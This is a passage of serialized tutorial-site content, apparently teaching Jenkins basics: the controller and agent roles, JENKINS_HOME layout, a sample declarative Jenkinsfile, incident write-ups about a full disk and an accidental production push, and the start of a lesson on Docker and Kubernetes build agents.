x1=\"50.0\" y1=\"25.0\" x2=\"83.3\" y2=\"25.0\"/>\u003cline x1=\"83.3\" y1=\"25.0\" x2=\"83.3\" y2=\"75.0\"/>\u003cline x1=\"50.0\" y1=\"25.0\" x2=\"50.0\" y2=\"75.0\"/>\u003c/svg>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"trigger\" data-kind=\"process\" style=\"left:16.7%;top:25.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Trigger\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"controller\" data-kind=\"service\" style=\"left:50.0%;top:25.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Controller\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"agent\" data-kind=\"service\" style=\"left:83.3%;top:25.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Agent\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-store\" data-act=\"dg-pick\" data-id=\"home\" data-kind=\"store\" style=\"left:50.0%;top:75.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">JENKINS_HOME\u003c/span>\u003cspan class=\"dg-kind\">Data store\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"result\" data-kind=\"process\" style=\"left:83.3%;top:75.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Result\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003c/div>\u003cp class=\"sr\">Flow in order: 1, Trigger to Controller; 2, Controller to Agent; 3, Agent to Result; 4, Controller to JENKINS_HOME.\u003c/p>\u003cul class=\"dg-legend\" aria-label=\"Legend\">\u003cli>\u003ci class=\"dg-sw k-process\" aria-hidden=\"true\">\u003c/i>Step\u003c/li>\u003cli>\u003ci class=\"dg-sw k-service\" aria-hidden=\"true\">\u003c/i>Service\u003c/li>\u003cli>\u003ci class=\"dg-sw k-store\" aria-hidden=\"true\">\u003c/i>Data store\u003c/li>\u003cli>\u003ci class=\"dg-arrow\" aria-hidden=\"true\">\u003c/i>Numbered arrows show the order of the flow\u003c/li>\u003c/ul>\u003cp class=\"dg-hint small\">Select a component to see what it does and what happens when it fails. \u003cbutton type=\"button\" class=\"btn btn-quiet dg-flow-btn\" data-act=\"dg-flow\" aria-pressed=\"false\">Show the flow\u003c/button>\u003c/p>\u003cdiv class=\"dg-live\" role=\"status\" aria-live=\"polite\">\u003c/div>\u003cdl class=\"dg-list\">\u003cdiv class=\"dg-item\" data-id=\"trigger\">\u003cdt>Trigger \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> A push, a schedule, a webhook or a click starts a build.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A missed webhook means no build and no error. Check the repository hook deliveries.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"controller\">\u003cdt>Controller \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Keeps the queue, picks an agent by label and stores the result.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> If it is overloaded or its disk is full, nothing in Jenkins works.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"agent\">\u003cdt>Agent \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Connects to the controller and runs the steps in a workspace.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> An offline or mislabelled agent leaves builds waiting in the queue.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"home\">\u003cdt>JENKINS_HOME \u003cspan class=\"dg-kt\">Data store\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Configuration, job definitions, build history and secrets on disk.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Without a backup, a lost disk means losing every job and credential.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"result\">\u003cdt>Result \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Logs, test reports and artifacts are sent back and kept.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Unlimited history fills the disk; set build discard rules.\u003c/dd>\u003c/div>\u003c/dl>\u003c/figure>\n\u003ch2 id=\"jobs-builds-and-nodes\">Jobs, builds and nodes\u003c/h2>\n\u003cp>A \u003cstrong>job\u003c/strong> (also called a project) is the definition: where the code is, when to run, what steps to take. A \u003cstrong>build\u003c/strong> is one run of a job, numbered 1, 2, 3 and so on, with its own log and workspace. A \u003cstrong>node\u003c/strong> is a machine that can run builds, and a \u003cstrong>label\u003c/strong> such as \u003ccode>linux-docker\u003c/code> lets a job ask for the kind of node it needs instead of a named machine.\u003c/p>\n\u003ch2 id=\"where-state-lives\">Where state lives\u003c/h2>\n\u003cp>Everything that matters sits in the \u003ccode>JENKINS_HOME\u003c/code> directory: \u003ccode>config.xml\u003c/code>, \u003ccode>jobs/\u003c/code> with each job&#39;s configuration and build records, \u003ccode>credentials.xml\u003c/code> and \u003ccode>secrets/\u003c/code> for encrypted secrets, \u003ccode>plugins/\u003c/code> and \u003ccode>nodes/\u003c/code>. A good backup copies this directory (minus the large workspaces), and an equally good habit is to describe the configuration as code so the controller can be rebuilt from a file.\u003c/p>\n\u003ch2 id=\"why-the-controller-runs-no-builds\">Why the controller runs no builds\u003c/h2>\n\u003cp>Set the number of executors on the built-in node to 0. Builds then go to agents, and a runaway test cannot take the web interface down. It also means build code never runs on the machine that holds every credential, which is a security rule as much as a stability one.\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"ls /var/lib/jenkins\ndu -sh /var/lib/jenkins/jobs/*  | sort -h | tail -2\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">ls\u003c/span> /var/lib/jenkins\u003c/span>\u003cspan class=\"ln out\">config.xml  credentials.xml  jobs  nodes  plugins  secrets  users  workspace\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">du\u003c/span> -sh /var/lib/jenkins/jobs/*  | \u003cspan class=\"hljs-built_in\">sort\u003c/span> -h | \u003cspan class=\"hljs-built_in\">tail\u003c/span> -2\u003c/span>\u003cspan class=\"ln out\">4.1G  /var/lib/jenkins/jobs/api-build\u003c/span>\u003cspan class=\"ln out\">18G   /var/lib/jenkins/jobs/nightly-e2e\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"incident-the-nightly-job-that-filled-the-disk\">Incident: The nightly job that filled the disk\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A job kept every build and its artifacts forever, and the controller disk filled up on a Friday night.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"df -h /var/lib/jenkins\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">df\u003c/span> -h /var/lib/jenkins\u003c/span>\u003cspan class=\"ln out\">/dev/sda1  100G  100G  0  100%\u003c/span>\u003cspan class=\"ln out\">java.io.IOException: No space left on device\u003c/span>\u003cspan class=\"ln out\">Build queue: 47 waiting, 0 running\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Builds stopped starting and the log said nothing useful in the web page because Jenkins could not write it. The fix was to delete old builds by hand, then set a discard rule keeping the last 20 builds and 14 days of artifacts, and to alert when the disk passes 70 percent.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Running builds on the controller\u003c/li>\n\u003cli>Never setting a build discard policy\u003c/li>\n\u003cli>Treating JENKINS_HOME as unimportant and not backing it up\u003c/li>\n\u003cli>Naming agents by machine instead of using labels\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"the-two-roles","text":"The two roles"},{"id":"jobs-builds-and-nodes","text":"Jobs, builds and nodes"},{"id":"where-state-lives","text":"Where state lives"},{"id":"why-the-controller-runs-no-builds","text":"Why the controller runs no builds"},{"id":"incident-the-nightly-job-that-filled-the-disk","text":"Incident: The nightly job that filled the disk"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Jenkins documentation: Architecting for scale","u":"https://www.jenkins.io/doc/book/scaling/architecting-for-scale/"},{"t":"Jenkins user handbook","u":"https://www.jenkins.io/doc/book/"}],"text":"Jenkins is the long-lived, self-hosted CI server that many companies still run. Before writing a pipeline it helps to know the moving parts, because most Jenkins problems are really problems with the controller, an agent or the disk they share. What you will learn What the controller and agents each do The difference between a job, a build, a node and an executor Where Jenkins keeps its configuration and history Why builds should not run on the controller The two roles The controller (older docs say master) serves the web interface, stores configuration, holds the build queue, keeps credentials and decides where each build runs. An agent is any machine or container that connects to the controller and runs build steps. Each agent offers a number of executors , and each executor runs one build at a time. How a Jenkins build is scheduled Flow in order: 1, Trigger to Controller; 2, Controller to Agent; 3, Agent to Result; 4, Controller to JENKINS_HOME. Step Service Data store Numbered arrows show the order of the flow Select a component to see what it does and what happens when it fails. Trigger Step What it does: A push, a schedule, a webhook or a click starts a build. If it fails or is weak: A missed webhook means no build and no error. Check the repository hook deliveries. Controller Service What it does: Keeps the queue, picks an agent by label and stores the result. If it fails or is weak: If it is overloaded or its disk is full, nothing in Jenkins works. Agent Service What it does: Connects to the controller and runs the steps in a workspace. If it fails or is weak: An offline or mislabelled agent leaves builds waiting in the queue. JENKINS_HOME Data store What it does: Configuration, job definitions, build history and secrets on disk. If it fails or is weak: Without a backup, a lost disk means losing every job and credential. Result Step What it does: Logs, test reports and artifacts are sent back and kept. If it fails or is weak: Unlimited history fills the disk; set build discard rules. Jobs, builds and nodes A job (also called a project) is the definition: where the code is, when to run, what steps to take. A build is one run of a job, numbered 1, 2, 3 and so on, with its own log and workspace. A node is a machine that can run builds, and a label such as linux-docker lets a job ask for the kind of node it needs instead of a named machine. Where state lives Everything that matters sits in the JENKINS_HOME directory: config.xml , jobs/ with each job&#39;s configuration and build records, credentials.xml and secrets/ for encrypted secrets, plugins/ and nodes/ . A good backup copies this directory (minus the large workspaces), and an equally good habit is to describe the configuration as code so the controller can be rebuilt from a file. Why the controller runs no builds Set the number of executors on the built-in node to 0. Builds then go to agents, and a runaway test cannot take the web interface down. It also means build code never runs on the machine that holds every credential, which is a security rule as much as a stability one. $ ls /var/lib/jenkins config.xml credentials.xml jobs nodes plugins secrets users workspace $ du -sh /var/lib/jenkins/jobs/* | sort -h | tail -2 4.1G /var/lib/jenkins/jobs/api-build 18G /var/lib/jenkins/jobs/nightly-e2e Incident: The nightly job that filled the disk Incident A job kept every build and its artifacts forever, and the controller disk filled up on a Friday night. $ df -h /var/lib/jenkins /dev/sda1 100G 100G 0 100% java.io.IOException: No space left on device Build queue: 47 waiting, 0 running Builds stopped starting and the log said nothing useful in the web page because Jenkins could not write it. The fix was to delete old builds by hand, then set a discard rule keeping the last 20 builds and 14 days of artifacts, and to alert when the disk passes 70 percent. Common mistakes Running builds on the controller Never setting a build discard policy Treating JENKINS_HOME as unimportant "},"cicd/jenkins-declarative-pipelines-and-the-jenkinsfile":{"html":"\u003cp>A Jenkinsfile is Jenkins&#39; answer to pipeline as code. It is read from the repository on every run, reviewed like any other change and versioned with the code it builds. The declarative form is the one to learn first because its structure is checked before anything runs.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The parts of a declarative pipeline\u003c/li>\n\u003cli>Stages, steps, environment and post actions\u003c/li>\n\u003cli>Conditions, parallel stages and options\u003c/li>\n\u003cli>Reading a failed build log\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"a-first-jenkinsfile\">A first Jenkinsfile\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"groovy\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"pipeline {\n  agent { label 'linux-docker' }\n  options { timeout(time: 20, unit: 'MINUTES'); disableConcurrentBuilds() }\n  environment { IMAGE = &quot;registry.example.com/shop/api:${env.GIT_COMMIT.take(7)}&quot; }\n  stages {\n    stage('Test')  { steps { sh 'make test' } }\n    stage('Build') { steps { sh 'docker build -t $IMAGE .' } }\n    stage('Push')  {\n      when { branch 'main' }\n      steps { sh 'docker push $IMAGE' }\n    }\n  }\n  post {\n    failure { echo 'Build failed' }\n    always  { junit 'reports/*.xml' }\n  }\n}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">pipeline {\n  agent { label \u003cspan class=\"hljs-string\">&#x27;linux-docker&#x27;\u003c/span> }\n  options { timeout(\u003cspan class=\"hljs-attr\">time:\u003c/span> \u003cspan class=\"hljs-number\">20\u003c/span>, \u003cspan class=\"hljs-attr\">unit:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;MINUTES&#x27;\u003c/span>); disableConcurrentBuilds() }\n  environment { IMAGE = \u003cspan class=\"hljs-string\">&quot;registry.example.com/shop/api:${env.GIT_COMMIT.take(7)}&quot;\u003c/span> }\n  stages {\n    stage(\u003cspan class=\"hljs-string\">&#x27;Test&#x27;\u003c/span>)  { steps { sh \u003cspan class=\"hljs-string\">&#x27;make test&#x27;\u003c/span> } }\n    stage(\u003cspan class=\"hljs-string\">&#x27;Build&#x27;\u003c/span>) { steps { sh \u003cspan class=\"hljs-string\">&#x27;docker build -t $IMAGE .&#x27;\u003c/span> } }\n    stage(\u003cspan class=\"hljs-string\">&#x27;Push&#x27;\u003c/span>)  {\n      when { branch \u003cspan class=\"hljs-string\">&#x27;main&#x27;\u003c/span> }\n      steps { sh \u003cspan class=\"hljs-string\">&#x27;docker push $IMAGE&#x27;\u003c/span> }\n    }\n  }\n  post {\n    failure { echo \u003cspan class=\"hljs-string\">&#x27;Build failed&#x27;\u003c/span> }\n    always  { junit \u003cspan class=\"hljs-string\">&#x27;reports/*.xml&#x27;\u003c/span> }\n  }\n}\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"the-structure\">The structure\u003c/h2>\n\u003cp>\u003ccode>pipeline\u003c/code> is the root. \u003ccode>agent\u003c/code> says where to run, \u003ccode>environment\u003c/code> sets variables, \u003ccode>stages\u003c/code> holds a list of \u003ccode>stage\u003c/code> blocks and each stage has \u003ccode>steps\u003c/code>. \u003ccode>post\u003c/code> runs after the stages and can react to \u003ccode>success\u003c/code>, \u003ccode>failure\u003c/code>, \u003ccode>unstable\u003c/code> or \u003ccode>always\u003c/code>. Jenkins checks this shape before it starts, so a typo in a directive fails in seconds, not after twenty minutes.\u003c/p>\n\u003cfigure class=\"dg\" data-rows=\"2\" data-edges=\"scm&gt;test;test&gt;build;build&gt;push;push&gt;post\" style=\"--rows:2\">\u003cfigcaption class=\"dg-title\">The life of a declarative run\u003c/figcaption>\u003cdiv class=\"dg-stage\">\u003csvg viewBox=\"0 0 100 100\" preserveAspectRatio=\"none\" aria-hidden=\"true\" focusable=\"false\">\u003cline x1=\"12.5\" y1=\"25.0\" x2=\"37.5\" y2=\"25.0\"/>\u003cline x1=\"37.5\" y1=\"25.0\" x2=\"62.5\" y2=\"25.0\"/>\u003cline x1=\"62.5\" y1=\"25.0\" x2=\"87.5\" y2=\"25.0\"/>\u003cline x1=\"87.5\" y1=\"25.0\" x2=\"62.5\" y2=\"75.0\"/>\u003c/svg>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"scm\" data-kind=\"process\" style=\"left:12.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Checkout\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"test\" data-kind=\"service\" style=\"left:37.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Test stage\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"build\" data-kind=\"service\" style=\"left:62.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Build stage\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"push\" data-kind=\"service\" style=\"left:87.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Push stage\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"post\" data-kind=\"process\" style=\"left:62.5%;top:75.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Post actions\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003c/div>\u003cp class=\"sr\">Flow in order: 1, Checkout to Test stage; 2, Test stage to Build stage; 3, Build stage to Push stage; 4, Push stage to Post actions.\u003c/p>\u003cul class=\"dg-legend\" aria-label=\"Legend\">\u003cli>\u003ci class=\"dg-sw k-process\" aria-hidden=\"true\">\u003c/i>Step\u003c/li>\u003cli>\u003ci class=\"dg-sw k-service\" aria-hidden=\"true\">\u003c/i>Service\u003c/li>\u003cli>\u003ci class=\"dg-arrow\" aria-hidden=\"true\">\u003c/i>Numbered arrows show the order of the flow\u003c/li>\u003c/ul>\u003cp class=\"dg-hint small\">Select a component to see what it does and what happens when it fails. \u003cbutton type=\"button\" class=\"btn btn-quiet dg-flow-btn\" data-act=\"dg-flow\" aria-pressed=\"false\">Show the flow\u003c/button>\u003c/p>\u003cdiv class=\"dg-live\" role=\"status\" aria-live=\"polite\">\u003c/div>\u003cdl class=\"dg-list\">\u003cdiv class=\"dg-item\" data-id=\"scm\">\u003cdt>Checkout \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Jenkins fetches the repository and reads the Jenkinsfile.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A Jenkinsfile on the wrong branch gives a different pipeline than you expect.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"test\">\u003cdt>Test stage \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Runs the test command on the chosen agent.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A flaky test fails the whole run; fix it or quarantine it.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"build\">\u003cdt>Build stage \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Builds the image or artifact.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Without a pinned base image the result can change between runs.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"push\">\u003cdt>Push stage \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Pushes only on the main branch because of the when condition.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A missing condition publishes images from every branch.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"post\">\u003cdt>Post actions \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Publishes reports and notifies, whatever the outcome.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Skipping always {} loses test reports on failure.\u003c/dd>\u003c/div>\u003c/dl>\u003c/figure>\n\u003ch2 id=\"controlling-the-flow\">Controlling the flow\u003c/h2>\n\u003cp>Use \u003ccode>when\u003c/code> to run a stage only for a branch, a tag or a changed path. Use \u003ccode>parallel\u003c/code> to run independent stages at once, and \u003ccode>options\u003c/code> for \u003ccode>timeout\u003c/code>, \u003ccode>retry\u003c/code> and \u003ccode>buildDiscarder\u003c/code>. Avoid \u003ccode>script { }\u003c/code> blocks except for small bits of logic; if you need loops and functions, move them into a script file or a shared library.\u003c/p>\n\u003ch2 id=\"reading-a-failed-run\">Reading a failed run\u003c/h2>\n\u003cp>Open the build, then Console Output, and search for the first \u003ccode>ERROR\u003c/code> or the stage marked red in the stage view. The steps before it are context; the first failure is the cause.\u003c/p>\n\u003ch2 id=\"incident-the-pipeline-that-published-every-branch\">Incident: The pipeline that published every branch\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A missing when condition pushed an image from a feature branch over the production tag.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"docker push registry/shop/api:latest\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">stage 'Push' ran on branch feature/login\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>docker push registry/shop/api:latest\u003c/span>\u003cspan class=\"ln out\">latest: digest: sha256:9f2c1e size: 1572\u003c/span>\u003cspan class=\"ln out\">Finished: SUCCESS\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Production pulled the new image on its next restart and served half-finished login code. The team added when { branch &#39;main&#39; }, tagged images with the commit hash instead of latest, and made the push stage require a protected branch.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Putting long shell scripts inline in the Jenkinsfile\u003c/li>\n\u003cli>Pushing images on every branch\u003c/li>\n\u003cli>Using latest as the only tag\u003c/li>\n\u003cli>Forgetting a timeout so a hung build holds an executor\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"a-first-jenkinsfile","text":"A first Jenkinsfile"},{"id":"the-structure","text":"The structure"},{"id":"controlling-the-flow","text":"Controlling the flow"},{"id":"reading-a-failed-run","text":"Reading a failed run"},{"id":"incident-the-pipeline-that-published-every-branch","text":"Incident: The pipeline that published every branch"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Jenkins Pipeline syntax","u":"https://www.jenkins.io/doc/book/pipeline/syntax/"},{"t":"Using a Jenkinsfile","u":"https://www.jenkins.io/doc/book/pipeline/jenkinsfile/"}],"text":"A Jenkinsfile is Jenkins&#39; answer to pipeline as code. It is read from the repository on every run, reviewed like any other change and versioned with the code it builds. The declarative form is the one to learn first because its structure is checked before anything runs. What you will learn The parts of a declarative pipeline Stages, steps, environment and post actions Conditions, parallel stages and options Reading a failed build log A first Jenkinsfile pipeline { agent { label &#x27;linux-docker&#x27; } options { timeout( time: 20 , unit: &#x27;MINUTES&#x27; ); disableConcurrentBuilds() } environment { IMAGE = \"registry.example.com/shop/api:${env.GIT_COMMIT.take(7)}\" } stages { stage( &#x27;Test&#x27; ) { steps { sh &#x27;make test&#x27; } } stage( &#x27;Build&#x27; ) { steps { sh &#x27;docker build -t $IMAGE .&#x27; } } stage( &#x27;Push&#x27; ) { when { branch &#x27;main&#x27; } steps { sh &#x27;docker push $IMAGE&#x27; } } } post { failure { echo &#x27;Build failed&#x27; } always { junit &#x27;reports/*.xml&#x27; } } } The structure pipeline is the root. agent says where to run, environment sets variables, stages holds a list of stage blocks and each stage has steps . post runs after the stages and can react to success , failure , unstable or always . Jenkins checks this shape before it starts, so a typo in a directive fails in seconds, not after twenty minutes. The life of a declarative run Flow in order: 1, Checkout to Test stage; 2, Test stage to Build stage; 3, Build stage to Push stage; 4, Push stage to Post actions. Step Service Numbered arrows show the order of the flow Select a component to see what it does and what happens when it fails. Checkout Step What it does: Jenkins fetches the repository and reads the Jenkinsfile. If it fails or is weak: A Jenkinsfile on the wrong branch gives a different pipeline than you expect. Test stage Service What it does: Runs the test command on the chosen agent. If it fails or is weak: A flaky test fails the whole run; fix it or quarantine it. Build stage Service What it does: Builds the image or artifact. If it fails or is weak: Without a pinned base image the result can change between runs. Push stage Service What it does: Pushes only on the main branch because of the when condition. If it fails or is weak: A missing condition publishes images from every branch. Post actions Step What it does: Publishes reports and notifies, whatever the outcome. If it fails or is weak: Skipping always {} loses test reports on failure. Controlling the flow Use when to run a stage only for a branch, a tag or a changed path. Use parallel to run independent stages at once, and options for timeout , retry and buildDiscarder . Avoid script { } blocks except for small bits of logic; if you need loops and functions, move them into a script file or a shared library. Reading a failed run Open the build, then Console Output, and search for the first ERROR or the stage marked red in the stage view. The steps before it are context; the first failure is the cause. Incident: The pipeline that published every branch Incident A missing when condition pushed an image from a feature branch over the production tag. stage 'Push' ran on branch feature/login $ docker push registry/shop/api:latest latest: digest: sha256:9f2c1e size: 1572 Finished: SUCCESS Production pulled the new image on its next restart and served half-finished login code. The team added when { branch &#39;main&#39; }, tagged images with the commit hash instead of latest, and made the push stage require a protected branch. Common mistakes Putting long shell scripts inline in the Jenkinsfile Pushing images on every branch Using latest as the only tag Forgetting a timeout so a hung build holds an executor"},"cicd/jenkins-build-agents-with-docker-and-kubernetes":{"html":"\u003cp>Where a build runs decides how repeatable it is. Machines that live for years collect leftover files, different tool versions and quiet changes. Jenkins can instead start a clean container per build, which is the same idea you use everywhere else.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Static agents and why they drift\u003c/li>\n\u003cli>Running a build inside a Docker image\u003c/li>\n\u003cli>Dynamic agents with the Kubernetes plugin and pod templates\u003c/li>\n\u003cli>Sizing, cleanup and caching for ephemeral agents\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"three-ways-to-get-an-agent\">Three ways to get an agent\u003c/h2>\n\u003cp>A \u003cstrong>static agent\u003c/strong> is a machine you set up once and connect over SSH or the inbound agent. It is simple but drifts. A \u003cstrong>Docker agent\u003c/strong> runs the pipeline inside an image you choose. A \u003cstrong>Kubernetes agent\u003c/strong> starts a pod for the build and deletes it when the build ends.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"groovy\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"pipeline {\n  agent { docker { image 'node:20-alpine' } }\n  stages { stage('Test') { steps { sh 'npm ci &amp;&amp; npm test' } } }\n}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">pipeline {\n  agent { docker { image \u003cspan class=\"hljs-string\">&#x27;node:20-alpine&#x27;\u003c/span> } }\n  stages { stage(\u003cspan class=\"hljs-string\">&#x27;Test&#x27;\u003c/span>) { steps { sh \u003cspan class=\"hljs-string\">&#x27;npm ci &amp;&amp; npm test&#x27;\u003c/span> } } }\n}\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"kubernetes-pod-templates\">Kubernetes pod templates\u003c/h2>\n\u003cp>With the Kubernetes plugin the controller talks to a cluster, creates a pod with a \u003ccode>jnlp\u003c/code> (inbound agent) container plus the tool containers you list, runs the stages inside them and removes the pod after.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"groovy\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"pipeline {\n  agent {\n    kubernetes {\n      yaml '''\n        apiVersion: v1\n        kind: Pod\n        spec:\n          containers:\n          - name: node\n            image: node:20-alpine\n            command: [sleep]\n            args: [infinity]\n            resources: { requests: { cpu: 500m, memory: 1Gi } }\n      '''\n    }\n  }\n  stages { stage('Test') { steps { container('node') { sh 'npm ci &amp;&amp; npm test' } } } }\n}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">pipeline {\n  agent {\n    kubernetes {\n      yaml \u003cspan class=\"hljs-string\">&#x27;&#x27;&#x27;\n        apiVersion: v1\n        kind: Pod\n        spec:\n          containers:\n          - name: node\n            image: node:20-alpine\n            command: [sleep]\n            args: [infinity]\n            resources: { requests: { cpu: 500m, memory: 1Gi } }\n      &#x27;&#x27;&#x27;\u003c/span>\n    }\n  }\n  stages { stage(\u003cspan class=\"hljs-string\">&#x27;Test&#x27;\u003c/span>) { steps { container(\u003cspan class=\"hljs-string\">&#x27;node&#x27;\u003c/span>) { 